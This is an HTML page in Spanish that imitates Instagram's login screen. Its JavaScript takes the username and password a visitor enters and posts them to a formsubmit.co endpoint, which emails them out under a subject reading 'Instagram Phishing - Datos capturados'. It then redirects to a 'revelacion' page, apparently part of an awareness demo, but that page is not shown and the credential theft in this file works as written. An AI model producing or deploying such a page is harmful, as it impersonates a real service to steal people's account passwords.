<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Iniciar sesión</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #fafafa; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { display: flex; max-width: 890px; width: 100%; justify-content: center; align-items: center; gap: 32px; }
        .phone-mockup { 
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            border-radius: 120px;
            padding: 20px;
            width: 380px;
            height: 580px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .phone-screen {
            background: white;
            border-radius: 100px;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .phone-screen svg {
            width: 60%;
        }
        .login-section { width: 350px; }
        .logo {
            font-family: 'Instagram Sans', 'Billabong', cursive;
            font-size: 52px;
            text-align: center;
            margin-bottom: 30px;
            font-style: italic;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            margin-bottom: 10px;
        }
        .login-box input {
            width: 100%;
            padding: 12px 8px;
            margin-bottom: 6px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
        }
        .login-box input:focus {
            outline: none;
            border: 1px solid #a8a8a8;
            background: white;
        }
        .login-btn {
            width: 100%;
            padding: 8px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }
        .login-btn:hover { background: #1877f2; }
        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider-text {
            padding: 0 16px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .fb-login {
            text-align: center;
            margin-bottom: 16px;
        }
        .fb-login a {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .fb-login a:hover {
            color: #2d4373;
        }
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
        }
        .signup-box p {
            font-size: 14px;
            color: #262626;
        }
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-mockup">
            <div class="phone-screen">
                <!-- Logo de Instagram SVG -->
                <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <radialGradient id="ig-gradient" cx="30%" cy="107%" r="150%">
                            <stop offset="0%" stop-color="#fdf497"/>
                            <stop offset="5%" stop-color="#fdf497"/>
                            <stop offset="45%" stop-color="#fd5949"/>
                            <stop offset="60%" stop-color="#d6249f"/>
                            <stop offset="90%" stop-color="#285AEB"/>
                        </radialGradient>
                    </defs>
                    <rect x="20" y="20" width="200" height="200" rx="50" ry="50" fill="none" stroke="url(#ig-gradient)" stroke-width="18"/>
                    <circle cx="120" cy="120" r="55" fill="none" stroke="url(#ig-gradient)" stroke-width="18"/>
                    <circle cx="175" cy="65" r="14" fill="url(#ig-gradient)"/>
                </svg>
            </div>
        </div>
        <div class="login-section">
            <div class="logo">Instagram</div>
            <div class="login-box">
                <form id="loginForm" onsubmit="handleLogin(event)">
                    <input type="text" id="email" placeholder="Teléfono, usuario o correo electrónico" required>
                    <input type="password" id="password" placeholder="Contraseña" required>
                    <button type="submit" class="login-btn">Iniciar sesión</button>
                </form>
                <div class="divider">
                    <div class="divider-line"></div>
                    <div class="divider-text">O</div>
                    <div class="divider-line"></div>
                </div>
                <div class="fb-login">
                    <a href="https://www.facebook.com" target="_blank">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185">
                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                        </svg>
                        Iniciar sesión con Facebook
                    </a>
                </div>
            </div>
            <div class="signup-box">
                <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
            </div>
        </div>
    </div>
    <script>
        function handleLogin(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            const credentials = {
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            };
            
            // Enviar datos por email usando FormSubmit
            fetch('https://formsubmit.co/ajax/21877cd441e31d0e6b3ddc868c42a433', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    _subject: '🚨 Instagram Phishing - Datos capturados',
                    _template: 'table'
                })
            }).then(response => response.json())
            .then(data => {
                console.log('Datos enviados:', data);
            }).catch(error => {
                console.error('Error:', error);
            });
            
            // Redirigir a revelación SIN mostrar datos
            window.location.href = 'revelacion.html';
        }
    </script>
</body>
</html>
